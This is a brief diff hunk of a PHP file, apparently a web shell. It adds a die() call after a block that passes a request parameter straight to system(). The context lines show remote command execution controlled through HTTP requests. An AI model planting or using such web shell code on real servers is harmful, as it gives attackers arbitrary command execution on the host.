@@ -47,4 +47,6 @@ if(isset($_REQUEST[$cmd])) {
        # http://php.net/manual/en/function.system.php
        system($command);
     }
+    
+    die();
 }
